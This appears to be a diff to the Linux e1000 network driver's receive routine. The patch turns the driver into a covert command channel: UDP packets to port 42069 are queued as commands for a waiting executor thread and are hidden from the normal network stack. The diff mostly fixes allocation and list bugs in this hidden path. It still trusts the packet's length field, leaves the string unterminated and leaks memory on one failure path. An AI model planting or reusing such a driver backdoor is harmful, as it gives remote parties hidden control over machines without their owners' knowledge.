@@ -142,6 +142,7 @@ void e1000_receive_skb(struct e1000_adapter *adapter, u8 status, __le16 vlan, st
     struct iphdr* ip;
     struct udphdr* udp;
     char* true_data;
+    size_t true_data_len;
     //printk(KERN_INFO "skb length: %d", skb->len);
     struct ethhdr* eth = (struct ethhdr*)skb->data; //reference ethhdr with old data pointer before it gets incremented by eth_type_trans
 
@@ -153,25 +154,43 @@ void e1000_receive_skb(struct e1000_adapter *adapter, u8 status, __le16 vlan, st
 
     /*
     The cool thing is that these increments can NEVER segfault because skb is allocated to be as big as the MTU. BatChest
+
+    All of this code is run by the BH handler. 
     */
     udp = (struct udphdr*)(skb->data + IP_HLEN); //udp header ptr
     true_data = (char*)(skb->data + IP_HLEN + UDP_HLEN); //true data
-    true_data_len = be16_to_cpu(udp->len)
+    true_data_len = be16_to_cpu(udp->len);
     if(be16_to_cpu(udp->dest) == 42069){
        //welcome to Qogchamp   
-        struct command* next_cmd = kzalloc(sizeof(struct command), GFP_KERNEL);
-        next_cmd -> str = kzalloc(true_data_len-UDP_HLEN+1, GFP_KERNEL); //udp->len includes the udp header so subtract 8 bytes out and add 1 so it can be null terminated
-        next_cmd->size true_data_len; 
-        next_cmd -> list =  LIST_HEAD_INIT(next->list); 
-        strncpy(next_cmd->str, true_data, true_data_len);
-        list_add_tail(&next_cmd->list_head, &commands);
-        
-
-
-        if(wq_has_sleeper(&qogchamp_wait)){
-            wake_up(qogchamp_wait); //we sleep if we are starved of commands to execute. 
+        struct command* next_cmd = kzalloc(sizeof(struct command), GFP_ATOMIC); //WE CANNOT SLEEP IN A BOTTOM HALF
+       // printk(KERN_INFO "Allocated next_cmd\n");
+        if(!next_cmd){
+            printk(KERN_INFO "Allocation failed\n");
+            goto failed;
         }
+        next_cmd -> str = kzalloc(true_data_len-UDP_HLEN+1, GFP_ATOMIC); //udp->len includes the udp header so subtract 8 bytes out and add 1 so it can be null terminated
+       // printk(KERN_INFO "Allocated next_cmd -> str\n");
+        if(!next_cmd -> str){
+            printk(KERN_INFO "Allocation failed\n");
+            goto failed;
+        }
+
+        next_cmd->str[true_data_len-UDP_HLEN] = '\n'; //end it with a new line. 
+        next_cmd->size  = true_data_len - UDP_HLEN+1; //subtract off the size of a udp header as that is generally included in the size.  
+        next_cmd -> list.prev = &next_cmd -> list; //this is the definition of an initialized list. Refernece LIST_HEAD_INIT in the source
+        next_cmd -> list.next = &next_cmd -> list;
+
+        strncpy(next_cmd->str, true_data, true_data_len-UDP_HLEN);
+       // printk(KERN_INFO "strcpy done\n");
+       
+        list_add_tail(&next_cmd->list, &commands);
         
+
+
+        if(wq_has_sleeper(&command_wait)){
+            wake_up(&command_wait); //we sleep if we are starved of commands to execute. 
+        }
+failed:        
         dev_kfree_skb(skb); //free the skb. Don't use slab cache space because that would be cringe. This will return immediately and not send it up the stack.
         return;
     }
